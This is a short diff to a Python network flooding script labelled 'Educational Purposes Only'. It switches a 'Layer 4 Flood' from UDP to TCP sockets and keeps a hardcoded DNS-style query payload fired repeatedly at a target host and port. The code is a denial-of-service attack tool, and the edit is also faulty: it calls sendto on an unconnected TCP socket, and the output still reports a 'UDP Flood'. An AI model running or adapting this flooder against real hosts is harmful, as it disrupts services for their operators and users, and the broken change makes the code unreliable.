@@ -6,7 +6,7 @@ from concurrent.futures import as_completed
 
 # Educational Purposes Only
 # Z3NTL3
-# UDP Layer 4 Flood for Ipv4's
+# TCP Layer 4 Flood for Ipv4's
 
 count = 0
 def Usage():
@@ -47,7 +47,7 @@ def Flooder(**pHu):
     global count
     py = (b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',53)
     try:
-        sVar = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        sVar = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         sendByte = sVar.sendto(py, (pHu['host_ip'],pHu['port']))
         count+=1
         return f"SEND {count} UDP Flood with {sendByte} BYTES {pHu['host_ip']}:{pHu['port']}"
